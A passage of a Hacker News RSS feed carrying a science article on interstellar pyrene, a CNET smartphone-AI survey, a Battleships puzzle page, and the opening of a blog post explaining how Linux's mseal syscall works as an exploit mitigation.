href="https://en.wikipedia.org/wiki/Pyrene#/media/File:Pyrene_molecule_from_xtal_ball.png">Jynto/Wikimedia Commons</a>, <a href="http://creativecommons.org/licenses/by/4.0/">CC BY</a>)</figcaption></figure><p>We know there are <a href="https://iopscience.iop.org/article/10.1088/1742-6596/728/6/062005/pdf">many large PAHs in space</a> because astrophysicists have detected signs of them in visible and infrared light. But we didn't know which PAHs they might be in particular.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>Pyrene is now the largest PAH detected in space, although it's what is known as a "small" or simple PAH, with 26 atoms. It was long thought such molecules could not survive the harsh environment of star formation when everything is bathed in radiation from the newborn suns, destroying complex molecules.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>In fact, it was once thought molecules of more than two atoms could not exist in space for this reason, <a href="https://articles.adsabs.harvard.edu/pdf/1988JRASC..82..115H">until they were actually found</a>. Also, chemical models show pyrene is very <a href="https://pubs.rsc.org/en/content/articlelanding/2024/cp/d4cp00096j">difficult to destroy</a> once formed.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>Last year, scientists <a href="https://www.science.org/doi/10.1126/science.adg6304">reported they found large amounts of pyrene</a> in samples from the  <a href="https://www.sciencealert.com/asteroid" data-linkid="73095" data-postid="141657" rel="nofollow" target="_self">asteroid</a> Ryugu in our own Solar System. They argued at least some of it must have come from the cold interstellar cloud that predated our Solar System.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>So why not look at another cold interstellar cloud to find some? The problem for astrophysicists is that we don't have the tools to detect pyrene directly – it's invisible to radio telescopes.</p><!-- START single/mrec -->
<!-- END single/mrec --><h2>Using a tracer</h2><p>The molecule the team has detected is called 1-cyanopyrene, what we call a "tracer" for pyrene. It is formed from pyrene interacting with cyanide, which is common in interstellar space.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>The researchers used the <a href="https://greenbankobservatory.org/">Green Bank Telescope in West Virginia</a> to look at the Taurus molecular cloud or TMC-1, in the Taurus constellation. Unlike pyrene itself, 1-cyanopyrene <a href="https://www2.mpia-hd.mpg.de/%7Ebeuther/Radio-10-Molecules-chemistry.pdf">can be detected by radio telescopes</a>. This is because 1-cyanopyrene molecules act as small radio-wave emitters – tiny versions of earthly radio stations.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>As scientists know the proportions of 1-cyanopyrene compared to pyrene, they can then estimate the amount of pyrene in the interstellar cloud.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>The amount of pyrene they found was significant. Importantly, this discovery in the Taurus molecular cloud suggests a lot of pyrene exists in the cold, dark molecular clouds that go on to form stars and solar systems.</p><figure><a href="https://images.theconversation.com/files/627840/original/file-20241024-17-oc64qy.jpg?ixlib=rb-4.1.0&amp;q=45&amp;auto=format&amp;w=1000&amp;fit=clip"><img decoding="async" alt="" src="https://images.theconversation.com/files/627840/original/file-20241024-17-oc64qy.jpg?ixlib=rb-4.1.0&amp;q=45&amp;auto=format&amp;w=754&amp;fit=clip" srcset="https://images.theconversation.com/files/627840/original/file-20241024-17-oc64qy.jpg?ixlib=rb-4.1.0&amp;q=45&amp;auto=format&amp;w=600&amp;h=305&amp;fit=crop&amp;dpr=1 600w, https://images.theconversation.com/files/627840/original/file-20241024-17-oc64qy.jpg?ixlib=rb-4.1.0&amp;q=30&amp;auto=format&amp;w=600&amp;h=305&amp;fit=crop&amp;dpr=2 1200w, https://images.theconversation.com/files/627840/original/file-20241024-17-oc64qy.jpg?ixlib=rb-4.1.0&amp;q=15&amp;auto=format&amp;w=600&amp;h=305&amp;fit=crop&amp;dpr=3 1800w, https://images.theconversation.com/files/627840/original/file-20241024-17-oc64qy.jpg?ixlib=rb-4.1.0&amp;q=45&amp;auto=format&amp;w=754&amp;h=384&amp;fit=crop&amp;dpr=1 754w, https://images.theconversation.com/files/627840/original/file-20241024-17-oc64qy.jpg?ixlib=rb-4.1.0&amp;q=30&amp;auto=format&amp;w=754&amp;h=384&amp;fit=crop&amp;dpr=2 1508w, https://images.theconversation.com/files/627840/original/file-20241024-17-oc64qy.jpg?ixlib=rb-4.1.0&amp;q=15&amp;auto=format&amp;w=754&amp;h=384&amp;fit=crop&amp;dpr=3 2262w" sizes="(min-width: 1466px) 754px, (max-width: 599px) 100vw, (min-width: 600px) 600px, 237px" loading="lazy"></a><figcaption>A wide-field view of part of the Taurus molecular cloud ~450 light-years from Earth. Its relative closeness makes it an ideal place to study the formation of stars. Many dark clouds of obscuring dust are clearly visible against the background stars. (<a href="https://www.eso.org/public/australia/images/eso1209d/?lang">ESO/Digitized Sky Survey 2. Acknowledgement: Davide De Martin.</a>)</figcaption></figure><h2>The complex birth of life</h2><p>We are gradually building a picture of how life on Earth evolved. This picture tells us that life came from space – well, at least the complex organic, pre-biological <a href="https://academic.oup.com/mnras/article/376/3/1201/1747108">molecules needed to form life did</a>.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>That pyrene survives the harsh conditions associated with the birth of stars, as shown by the findings from Ryugu, is an important part of this story.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>Simple life – consisting of a single cell – appeared in Earth's fossil record almost immediately (in geological and astronomical terms) after the planet's surface had cooled enough to not vaporise complex molecules. This happened <a href="https://naturalhistory.si.edu/education/teaching-resources/life-science/early-life-earth-animal-origins">more than 3.7 billion years ago</a> in Earth's approximately 4.5 billion history.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>For simple organisms to then appear so quickly in the fossil record, there's just not enough time for chemistry to start with mere simple molecules of two or three atoms.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>The new discovery of 1-cyanopyrene in the Taurus molecular cloud shows complex molecules could indeed survive the harsh conditions of our Solar System's formation. As a result, pyrene was available to form the backbone of carbon-based life when it emerged on the early Earth some 3.7 billion years ago.</p><!-- START single/mrec -->
<!-- END single/mrec --><p>This discovery also links to another important finding of the last decade – the first chiral molecule in the interstellar medium, propylene oxide. We need chiral molecules to make the evolution of simple lifeforms work <a href="https://theconversation.com/is-there-life-through-the-looking-glass-the-riddle-of-lifes-single-handedness-48819">on the surface of the early Earth</a>.</p><p>So far, our theories that molecules for early life on Earth came from space are looking good.<!-- Below is The Conversation's page counter tag. Please DO NOT REMOVE. --><img decoding="async" src="https://counter.theconversation.com/content/241889/count.gif?distributor=republish-lightbox-basic" alt="The Conversation" width="1" height="1" referrerpolicy="no-referrer-when-downgrade" loading="lazy"><!-- End of code. If you don't see any code above, please get new code from the Advanced tab after you click the republish button. The page counter does not collect any personal data. More info: https://theconversation.com/republishing-guidelines -->
</p><p><em><a href="https://theconversation.com/profiles/maria-cunningham-2240914">Maria Cunningham</a>, Honorary Senior Lecturer, School of Physics, </em><a href="https://theconversation.com/institutions/unsw-sydney-1414"><em>UNSW Sydney</em></a></p><p><strong>This article is republished from <a href="https://theconversation.com/">The Conversation</a> under a Creative Commons license. Read the <a href="https://theconversation.com/astronomers-just-found-complex-carbon-molecules-in-space-a-step-closer-to-deciphering-the-origins-of-life-241889">original article</a>.</strong></p>
		</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Smartphone buyers meh on AI, care much more about battery life (300 pts)]]></title>
            <link>https://www.cnet.com/tech/mobile/with-apple-intelligence-on-the-horizon-a-quarter-of-smartphone-owners-are-unimpressed-by-ai/</link>
            <guid>41946188</guid>
            <pubDate>Fri, 25 Oct 2024 15:26:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnet.com/tech/mobile/with-apple-intelligence-on-the-horizon-a-quarter-of-smartphone-owners-are-unimpressed-by-ai/">https://www.cnet.com/tech/mobile/with-apple-intelligence-on-the-horizon-a-quarter-of-smartphone-owners-are-unimpressed-by-ai/</a>, See on <a href="https://news.ycombinator.com/item?id=41946188">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2>Key takeaways:<br></h2><ul><li>A quarter of smartphone owners (25%) don't find AI features helpful, 45% are reluctant to pay a monthly subscription fee for AI capabilities and 34% have privacy concerns.</li><li>A little over half (52%) of smartphone owners have no interest in purchasing a foldable phone.</li><li>The biggest motivation for US adult smartphone owners to upgrade their devices is longer battery life (61%), followed by more storage (46%) and better camera features (38%). Just 18% say their main motivator is AI integrations.</li></ul><p>As smartphone makers including Apple, Google and Samsung place a growing emphasis on AI features in their latest devices, a CNET survey found a quarter of smartphone owners don't find those capabilities particularly useful, and just 18% say AI integrations are their main motivator for upgrading their phone.&nbsp;</p><div><div><svg><use xlink:href="#play"></use></svg> <figure><div><picture> <img src="https://www.cnet.com/a/img/resize/8064e8a5614e1aebc4a7ea0af4180156fcdc4f36/hub/2024/09/05/153a53a9-5c5a-44fa-87ee-bd7781666d2a/240905-site-iphone-16-tears-fans-apart-1.jpg?auto=webp&amp;width=768" alt="" height="306" width="768"> </picture></div> <!----></figure></div> <p><strong>Watch this:</strong> The iPhone 16 Comes With AI Drama
      </p> <p><time><svg><use xlink:href="#play"></use></svg> <span>07:37</span></time></p></div><p>In fact, the biggest drivers for buying a new device, according to respondents, is longer battery life (61%), more storage (46%) and better camera features (38%).&nbsp;</p><p>This comes as Apple gears up for the public launch of its&nbsp;<a href="https://www.cnet.com/tech/mobile/what-is-apple-intelligence-everything-to-know-about-iphone-16-ai-features/" target="_self" rel="follow">Apple Intelligence</a> suite of AI features <a href="https://www.cnet.com/tech/services-and-software/apple-releases-final-ios-18-1-public-beta-with-apple-intelligence-how-to-download-it/" target="_self" rel="follow">next week</a>, which includes capabilities like a&nbsp;<a href="https://www.cnet.com/tech/services-and-software/wwdc-kicks-off-what-apple-calls-a-new-era-for-siri/" rel="follow" target="_self">smarter Siri</a>,&nbsp;<a href="https://www.cnet.com/tech/mobile/apple-intelligence-arrives-but-only-in-developer-beta-for-now/" rel="follow" target="_self">AI-powered writing tools</a>&nbsp;and&nbsp;<a href="https://www.cnet.com/tech/mobile/apple-intelligence-brings-ai-to-the-iphone-with-chatgpt-integration-and-more/" rel="follow" target="_self">ChatGPT integration</a>. Apple Intelligence will be available on <a href="https://www.cnet.com/tech/mobile/apple-iphone-15-pro-and-15-pro-max-review-love-at-first-zoom/" target="_self" rel="follow">iPhone 15 Pro models</a> and the <a href="https://www.cnet.com/tech/mobile/apple-iphone-16-and-16-plus-review-little-improvements-add-up/" target="_self" rel="follow">iPhone 16</a> lineup.</p><p>Google also leaned heavily into AI features when it unveiled the <a href="https://www.cnet.com/tech/mobile/google-pixel-9-review-chock-full-of-ai-but-thats-not-what-makes-it-great/" target="_self" rel="follow">Pixel 9</a> series in August, spending much of its keynote <a href="https://www.cnet.com/tech/mobile/at-googles-pixel-9-event-gemini-steals-the-spotlight/" target="_self" rel="follow">discussing new Gemini functions</a>&nbsp;like <a href="https://www.cnet.com/tech/services-and-software/at-google-io-gemini-really-wants-to-talk-with-you/" target="_self" rel="follow">Live</a>, which lets you have a natural-sounding, back-and-forth conversation with the virtual assistant. And at its July <a href="https://www.cnet.com/tech/mobile/samsungs-jam-packed-galaxy-unpacked-galaxy-ring-z-fold-6-and-all-the-new-products-announced/" target="_self" rel="follow">Unpacked</a> event, Samsung similarly touted <a href="https://www.cnet.com/tech/mobile/my-favorite-samsung-galaxy-ai-features/" target="_self" rel="follow">Galaxy AI</a>, which can simplify tasks like translating messages and editing photos.</p><p>While these new features rely on generative AI to produce text or images or to enhance digital assistants, AI itself has been embedded in smartphones for years. For instance, your phone's camera uses AI to process images and blur backgrounds in Portrait mode, and Siri and Google Assistant have always been AI-based (albeit using less advanced versions of the tech). But because this new wave of AI introduces ways to more explicitly accomplish tasks on your phone, rather than blending into existing features, it may take some time for people to warm up to.</p><h2>AI could soon cost you -- and not everyone is sold</h2><p>As tech giants continue to roll out these AI functions, consumers may soon have to pay the price if they want to keep using them. Samsung's website says its Galaxy AI features "will be provided for free until the end of 2025 on supported Samsung Galaxy devices." To utilize Gemini's full power across Google's apps, you'll need to subscribe to <a href="https://www.cnet.com/tech/services-and-software/google-gemini-advanced-review-dont-cancel-your-chatgpt-plus-subscription/" target="_self" rel="follow">Gemini Advanced</a>. And it's likely Apple could also someday&nbsp;<a href="https://www.cnet.com/tech/mobile/apple-intelligence-may-eventually-cost-you/" rel="follow" target="_self">charge for some of its AI-powered iPhone features</a>.</p><p>Many <a href="https://www.cnet.com/tech/mobile/subscription-fatigue-ai-phone-features-will-soon-cost-us-why-im-not-sold/" target="_self" rel="follow">consumers aren't sold</a>. Nearly half of smartphone owners say they're not willing to pay extra money to access AI on their phones. That's not much of a surprise, given how much subscription fatigue is already weighing people down. Another&nbsp;<a href="https://www.cnet.com/personal-finance/subscription-creep-costs-us-consumers-more-than-1000-a-year-cnet-survey-finds/" rel="follow" target="_self">CNET study</a>&nbsp;from April found that US adults spend an average of $91 on subscription services every month. Two-thirds of respondents said at least one of their subscriptions got more expensive within the last year. Adding yet another monthly fee, therefore, may not be so enticing.&nbsp;</p><p>Still, there are those who are eager to tap into AI on their phones, with Gen Zers and Millennials being the most enthused: 20% of respondents from each generation say they're excited about AI capabilities and find them helpful. Additionally, 15% of Gen Zers and 16% of Millennials use AI on their phones for tasks like photo editing, image creation and summarizing or writing text. Also, 20% of Gen Zers and 19% of Millennials regularly use an AI tool like ChatGPT or Google Gemini on their smartphones.&nbsp;</p><p>Privacy remains a key concern when it comes to AI, with one-third (34%) of smartphone owners flagging their unease in that department. Tech giants have placed a growing emphasis on privacy considerations during their AI-focused keynotes. At its&nbsp;<a href="https://www.cnet.com/news-live/apple-wwdc-6-10-2024-live-blog/" rel="follow" target="_self">Worldwide Developers Conference</a>&nbsp;in June, for instance, Apple noted many of its <a href="https://www.cnet.com/tech/mobile/apple-intelligence-brings-ai-to-the-iphone-with-chatgpt-integration-and-more/" target="_self" rel="follow">AI models run on-device</a>, which is generally considered more private, since information doesn't have to travel over the internet. When a task calls for more computational power, relevant data will be sent to <a href="https://www.cnet.com/tech/services-and-software/apple-says-its-ai-sets-a-new-standard-for-privacy-invites-security-experts-to-test-it/" target="_self" rel="follow">Apple Silicon servers</a>, and that data <a href="https://www.apple.com/gn/newsroom/2024/06/apple-extends-its-privacy-leadership-with-new-updates-across-its-platforms/" target="_blank" rel="noopener nofollow">won't be stored</a> or made accessible to Apple, the company says.&nbsp;</p><h2>The biggest reasons to upgrade a phone</h2><p>With AI being among the last reasons consumers want to upgrade their smartphones, other considerations like longer battery life, more storage and better camera features still dominate. Other motivators include phone display and screen size (32%); keeping the same ecosystem, like iOS or Android (24%); and phone color (10%).&nbsp;</p><p>With the high cost of devices (many flagship phones will cost you anywhere between $800 and $1,200), consumers may not want to <a href="https://www.cnet.com/tech/mobile/getting-a-new-iphone-every-2-years-is-making-less-sense-than-ever/" target="_self" rel="follow">upgrade their devices as frequently</a>. According to our survey, 44% claim they only get a new device when their current phone breaks or needs replacing. Further, 30% hang onto their devices for three years or longer, while 18% upgrade every two years and just 8% get a new phone every year.&nbsp;</p><p>Luckily for consumers, Apple didn't implement a price hike with the <a href="https://www.cnet.com/deals/best-iphone-16-deals/" target="_self" rel="follow">iPhone 16</a>. Still, iPhone users hold onto their devices for longer than other smartphone owners; one-third will will wait three years or more for an upgrade.</p><h2>Foldable phone hype just isn't there yet</h2><p>Companies like Google and Samsung have continued to roll out foldable phones, with the latest being the <a href="https://www.cnet.com/tech/mobile/googles-pixel-9-pro-fold-might-be-a-sequel-that-actually-delivers/" target="_self" rel="follow">Pixel 9 Pro Fold</a> and the&nbsp;<a href="https://www.cnet.com/tech/mobile/galaxy-z-flip-6-review-the-aha-moment-that-sold-me-until-i-saw-the-price/" target="_self" rel="follow">Galaxy Z Flip</a> and <a href="https://www.cnet.com/tech/mobile/samsung-galaxy-z-fold-6-review-steps-forward-and-backward/" target="_self" rel="follow">Fold 6</a>, respectively. But consumers still feel lukewarm about the concept of a foldable handheld device. Just over half (52%) of smartphone owners say they're not interested in buying a foldable phone, while 13% say they'd be interested sometime in the next two years.</p><p>That gives Apple, which has yet to enter the foldable phone space, the opportunity to tap into that interest. Experts have long speculated that a <a href="https://www.cnet.com/tech/mobile/iphone-flip-apples-foldable-phone-could-arrive-before-folding-macbook-or-ipad/" target="_self" rel="follow">foldable iPhone</a> could be what it takes to spur wider adoption of foldable smartphones. But it may be several years before that happens, if it ever does.</p><h2>Methodology&nbsp;</h2><p>All figures, unless otherwise stated, are from YouGov Plc. Total sample size was 2,484 adults, including 2,387 smartphone owners. Fieldwork was undertaken Aug. 28-30, 2024. The survey was carried out online. The figures have been weighted and are representative of all US adults (aged 18-plus).</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Battleships Logic Puzzle (204 pts)]]></title>
            <link>https://lukerissacher.com/battleships</link>
            <guid>41946036</guid>
            <pubDate>Fri, 25 Oct 2024 15:12:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lukerissacher.com/battleships">https://lukerissacher.com/battleships</a>, See on <a href="https://news.ycombinator.com/item?id=41946036">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        
        <p>
            Click squares to set where you think the ships and water are. <br>
            Numbers show how many ship parts are on that row or column.
        </p>


        

        <h2>Instructions</h2>
        <p>
            I find these puzzles to be a fun mindless activity while listening to podcasts, thought I'd
            share them. They're a version of the <a href="https://en.wikipedia.org/wiki/Battleship_(puzzle)" target="_blank">
                Battleship Logic Puzzle</a> - also known as Battleship Solitaire, Bimaru, or Yubotu.
        </p>
        <p>
            Various sized ships (shown on top of the puzzle) are hidden on the board. 
            To solve the puzzle, fill all squares correctly.
            Numbers show how many "boat squares" are in each row or column:
        </p>
        <div>
            <p><img src="https://lukerissacher.com/static/images/battleships/boat_count_1.png?v=1518898716">
            </p>
            <p><img src="https://lukerissacher.com/static/images/battleships/boat_count_2.png?v=1518898728">
            </p>
        </div>
        <p>
            Ships can't touch, not even diagonally. 
        </p>

        

        <h2>Strategy Tips</h2>
        <p>
            If you get stuck during a game, these rules / tips can help:
        </p>

        <p>
            <strong>Only-spots-left rule:</strong> if a row has e.g. 3 boat squares and
            all but 3 squares are water, the rest must be boats:
        </p>
        <div>
            <p><img src="https://lukerissacher.com/static/images/battleships/only_spots_left.png?v=1518899129">
            </p>
        </div>

        <p>
            <strong>The-rest-is-water rule:</strong> likewise, if a row already has the
            required number of boats (including 0), the rest is water:
        </p>
        <div>
            <p><img src="https://lukerissacher.com/static/images/battleships/rest_is_water.png?v=1518899297">
            </p>
        </div>
        <p>
            Tip: you can click on these numbers to auto-fill water.
        </p>

        <p>
            <strong>Water-on-corners rule:</strong> since ships can't touch diagonally,
            you can always set the corners around a boat square to water:
        </p>
        <div>
            <p><img src="https://lukerissacher.com/static/images/battleships/fill_corners.png?v=1518899520">
            </p>
        </div>

        <p>
            <strong>Surround-whole-boats rule:</strong> if you know where a 
            whole boat is, you can surround it completely with water:
        </p>
        <div>
            <p><img src="https://lukerissacher.com/static/images/battleships/surround.png?v=1518899945">
            </p>
        </div>

        <p>
            <strong>Only-place-it-could-fit rule:</strong> often there's only one spot
            left on the board that the largest ship could fit:
        </p>
        <div>
            <p><img src="https://lukerissacher.com/static/images/battleships/only_fit.png?v=1518900280">
            </p>
        </div>

        <p>Playable on mobile devices, for on-the-toilet fun.</p>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A deep dive into Linux's new mseal syscall (210 pts)]]></title>
            <link>https://blog.trailofbits.com/2024/10/25/a-deep-dive-into-linuxs-new-mseal-syscall/</link>
            <guid>41945894</guid>
            <pubDate>Fri, 25 Oct 2024 14:58:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.trailofbits.com/2024/10/25/a-deep-dive-into-linuxs-new-mseal-syscall/">https://blog.trailofbits.com/2024/10/25/a-deep-dive-into-linuxs-new-mseal-syscall/</a>, See on <a href="https://news.ycombinator.com/item?id=41945894">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="page" role="main">

			
				
<article id="post-108435">
	<!-- .entry-header -->

	<div>
		<p><em>By Alan Cao</em></p>
<p>If you love exploit mitigations, you may have heard of a new system call named <code>mseal</code> landing into the Linux kernel’s 6.10 release, providing a protection called “memory sealing.” Beyond notes from the authors, very little information about this mitigation exists. In this blog post, we’ll explain what this syscall is, including how it’s different from prior memory protection schemes and how it works in the kernel to protect virtual memory. We’ll also describe the particular exploit scenarios that <code>mseal</code> helps stop in Linux userspace, such as stopping malicious permissions tampering and preventing memory unmapping attacks.</p>
<h3>What mseal is (and isn’t)</h3>
<p>Memory sealing allows developers to make memory regions immutable from illicit modifications during program runtime. When a virtual memory address (VMA) range is sealed, an attacker with a code execution primitive cannot perform subsequent virtual memory operations to change the VMA’s permissions or modify how it is laid out for their benefit.</p>
<p>If you’re like me and followed the <a href="https://lore.kernel.org/lkml/CAHk-=wh+6n6f0zuezKem+W=aytHMv2bib6Fbrg-xnWOoujFb6g@mail.gmail.com/">spicy discourse</a>&nbsp;surrounding this syscall in the kernel mailing lists, you may have observed that Chrome’s Security team introduced it to support their <a href="https://v8.dev/blog/control-flow-integrity">V8 CFI strategy</a>, initially for Linux-based ChromeOS. After some lengthy deliberation and several rewrites, it finally landed in the kernel, with plans to expand its use case beyond browsers with <a href="https://lwn.net/Articles/978010/">its integration into glibc, possibly in version 2.41</a>.</p>
<p><code>mseal</code>’s security guarantees are unlike Linux’s <code>memfd_create</code> and its <code>memfd_secret</code> variant, which provide file sealing. <code>memfd_create</code> and <code>memfd_secret</code> allow one to create RAM-backed anonymous files as an alternative to storing content to <code>tmpfs</code>, with <code>memfd_secret</code> taking it a step further by ensuring that the region of memory is accessible only to the process holding the file descriptor. This lets developers create “secure enclave”-style userspace mappings that can guard sensitive in-memory data.</p>
<p><code>mseal</code> digresses from prior memory protection schemes on Linux because it is a syscall tailored specifically for <em>exploit mitigation</em> against remote attackers seeking code execution rather than potentially local ones looking to exfiltrate sensitive secrets in-memory.</p>
<p>To understand <code>mseal</code>’s security mitigations, we must first study its implementation to understand how it operates. Luckily, <code>mseal</code> is simple to understand, so let’s look at how it works in the kernel!</p>
<h3>A look under the hood</h3>
<p><code>mseal</code> has a simple function signature:</p>
<pre><span>int</span> mseal(<span>unsigned</span> long start, size_t len, <span>unsigned long</span> flags)
</pre>
<ul>
<li><code>start</code> and <code>len</code> represent the start/end range of a valid VMA that we want to seal, and len must be properly page-aligned.</li>
<li><code>flags</code> are unused at the time of writing and must be set to 0.</li>
</ul>
<p>In the 6.12 kernel, its syscall definition calls <a href="https://elixir.bootlin.com/linux/v6.12-rc3/source/mm/mseal.c#L212"><code>do_mseal</code></a>:</p>
<pre><span>static</span> <span>int</span> do_mseal(<span>unsigned long</span> start, size_t len_in, <span>unsigned long</span> flags)
{
    size_t len;
    <span>int</span> ret = <span>0</span>;
    <span>unsigned long</span> end;
    <span>struct</span> mm_struct *mm = current-&gt;mm;     <span>// [1]</span>

    <span>// ... Check flags == 0, check page alignment, and compute `end`</span>

    <span>if</span> (mmap_write_lock_killable(mm))          <span>// [2]</span>
        <span>return</span> -EINTR;

    /*
     * First pass, <span>this</span> helps to avoid
     * partial sealing in <span>case</span> of <span>error</span> in input address range,
     * e.g. ENOMEM <span>error</span>.
     */
    ret = check_mm_seal(start, end);            <span>// [3]</span>
    <span>if</span> (ret)
        <span>goto</span> out;

    /*
     * Second pass, <span>this</span> should success, unless there are errors
     * from vma_modify_flags, e.g. merge/split <span>error</span>, or process
     * reaching the max supported VMAs, however, those cases shall
     * be rare.
     */
    ret = apply_mm_seal(start, end);            <span>// [4]</span> 

out:
    mmap_write_unlock(current-&gt;mm);
    <span>return</span> ret;
}
</pre>
<p><code>do_mseal</code> will first compute an <code>end</code> offset from the provided length and lock the memory region <code>[2]</code> to prevent concurrent access to the page. The global <code>current</code> at <code>[1]</code> represents the current executing <code>task_struct</code> (i.e., the process invoking <code>mseal</code>). The referenced field is the <a href="https://elixir.bootlin.com/linux/v6.12-rc3/source/include/linux/mm_types.h#L790"><code>mm_struct</code></a> representing the task’s entire virtual memory address space. The critical field in <code>mm_struct</code> on which this syscall will operate is <code>mmap</code>, a list of <a href="https://elixir.bootlin.com/linux/v6.12-rc3/source/include/linux/mm_types.h#L667"><code>vm_area_struct</code></a> values. This represents a single contiguous memory region created by <code>mmap</code>, such as the stack or VDSO.</p>
<p>The <code>check_mm_seal</code> call at <code>[3]</code> ensures that the targeted memory map for sealing is a valid range by iterating over each VMA from <code>current-&gt;mm</code> to test boundary correctness.</p>
<pre><span>static</span> <span>int</span> check_mm_seal(<span>unsigned long</span> start, <span>unsigned long</span> end)
{
    <span>struct</span> vm_area_struct *vma;
    <span>unsigned long</span> nstart = start;

    VMA_ITERATOR(vmi, current-&gt;mm, start);

    /* going through each vma to check. */
    for_each_vma_range(vmi, vma, end) {
        <span>if</span> (vma-&gt;vm_start &gt; nstart)
            /* unallocated memory found. */
            <span>return</span> -ENOMEM;
        <span>if</span> (vma-&gt;vm_end &gt;= end)
            <span>return</span> <span>0</span>;

        nstart = vma-&gt;vm_end;
    }
    <span>return</span> -ENOMEM;
}
</pre>
<p>The magic happens in the <code>apply_mm_seal</code> call <code>[4]</code>, which walks over each VMA again and arranges for the targeted region to have an additional <code>VM_SEALED</code> flag through the <code>mseal_fixup</code> call:</p>
<pre><span>static</span> <span>int</span> apply_mm_seal(<span>unsigned long</span> start, <span>unsigned long</span> end)
{
    // ...
    nstart = start;
    for_each_vma_range(vmi, vma, end) {
        <span>int</span> <span>error</span>;
        <span>unsigned long</span> tmp;
        vm_flags_t newflags;

        newflags = vma-&gt;vm_flags | VM_SEALED;
        tmp = vma-&gt;vm_end;
        <span>if</span> (tmp &gt; end)
            tmp = end;
        <span>error</span> = mseal_fixup(vmi, vma, &amp;prev, nstart, tmp, newflags);
        <span>if</span> (<span>error</span>)
            <span>return error</span>;
        nstart = vma_iter_end(&amp;vmi);
    }
    <span>return</span> <span>0</span>;
}
</pre>
<p>To ensure that unwanted memory operations respect this new flag, the <code>mseal</code> patchset adds <code>VM_SEALED</code> checks to the following files:</p>
<pre><span> mm/madvise.c                                |   12 +
 mm/mmap.c                                   |   31 +-
 mm/mprotect.c                               |   10 +
 mm/mremap.c                                 |   31 +
 mm/mseal.c                                  |  307 ++++
</span></pre>
<p>For instance, <code>mprotect</code> and <code>pkey_mprotect</code> will enforce this check when it eventually invokes <a href="https://elixir.bootlin.com/linux/v6.12-rc3/source/mm/mprotect.c#L614"><code>mprotect_fixup</code></a>:</p>
<pre><span>int</span>
mprotect_fixup(..., <span>struct</span> vm_area_struct *vma, ...)
{
    <span>// ...</span>
    <span>if</span> (!can_modify_vma(vma))
        <span>return</span> -EPERM;
    }
    <span>// ...</span>
}
</pre>
<p>To determine whether the syscall should continue, <code>can_modify_vma</code>—defined in <a href="https://elixir.bootlin.com/linux/v6.12-rc3/source/mm/vma.h#L534"><code>mm/vma.h</code></a>—will test for the existence of <code>VM_SEALED</code> in the specified <code>vm_area_struct</code>:</p>
<pre><span>static inline</span> bool vma_is_sealed(<span>struct</span> vm_area_struct *vma)
{
    <span>return</span> (vma-&gt;vm_flags &amp; VM_SEALED);
}

/*
 * check <span>if</span> a vma is sealed <span>for</span> modification.
 * <span>return</span> true, <span>if</span> modification is allowed.
 */
<span>static inline</span> bool can_modify_vma(<span>struct</span> vm_area_struct *vma)
{
    <span>if</span> (unlikely(vma_is_sealed(vma)))
        <span>return</span> false;

    <span>return</span> true;
}
</pre>
<p>From the changes in other memory-management syscalls, we can determine the operations that are not permitted on a VMA after it is sealed:</p>
<ul>
<li>Changing permission bits with <code>mprotect</code> and <code>pkey_mprotect</code></li>
<li>Unmapping with <code>munmap</code></li>
<li>Replacement of a sealed map with <code>mmap</code>(<code>MAP_FIXED</code>) with another one that is mutable/unsealed</li>
<li>Expanding or shrinking its size with <code>mremap</code>. Shrinking to zero could create a refillable hole for a new mapping with no sealing, as it triggers an unmap altogether.</li>
<li>Migrating to a new destination with <code>mremap(MREMAP_MAYMOVE | MREMAP_FIXED)</code>. Note that sealing checks are imposed on both the source and destination VMAs. Also, the source VMA will be unmapped if <code>MREMAP_DONTUNMAP</code> is not supplied, but the <code>munmap</code> sealing check will still apply.</li>
<li>Calling <code>madvise</code> with the <a href="https://elixir.bootlin.com/linux/v6.12-rc3/source/mm/mseal.c#L26-#L32">following destructive flags</a></li>
</ul>
<p>For now, one can invoke <code>mseal</code> on a 6.10+ kernel through a direct syscall invocation. Here’s a basic wrapper implementation to help you get started:</p>
<pre>#<span>include</span> &lt;sys/syscall.h&gt;
#<span>include</span> <span>&lt;unistd.h&gt;</span>

#define MSEAL_SYSCALL <span>462</span>

<span>long</span> mseal(<span>unsigned long</span> start, size_t len)
{
    <span>int</span> page_size;
    uintptr_t page_aligned_start;

    /* how large a page should be on our system (<span>default</span>: <span>4096</span> bytes) */
    page_size = getpagesize();

    /* page align the VMA range we want to seal */
    page_aligned_start = start &amp; ~(page_size - 1);
    <span>return</span> syscall(MSEAL_SYSCALL, page_aligned_start, len, <span>0</span>);
}
</pre>
<h3>What exploit techniques does mseal help mitigate?</h3>
<p>From the disallowed operations, we can discern two particular exploit scenarios that memory sealing will prevent:</p>
<ul>
<li>Tampering with a VMA’s permissions. Notably, not allowing executable permissions to be set can stop the revival of shellcode-based attacks.</li>
<li>“Hole-punching” through arbitrary unmapping/remapping of a memory region, mitigating data-only exploits that take advantage of refilling memory regions with attacker-controlled data.</li>
</ul>
<p>Let’s examine these scenarios in more detail, and the defense-in-depth strategies developers can employ in their software implementations.</p>
<h4>Hardening NX</h4>
<p>Even with the continued existence of code reuse techniques like ROP, attackers may prefer to gain shellcoding capability during exploitation; this can provide a stable and “easy win,” especially if constraints are imposed on the gadget chain. Here is a potential workflow to achieve this:</p>
<ul>
<li>Through some target functionality, spray shellcode onto a non-executable stack/heap region.</li>
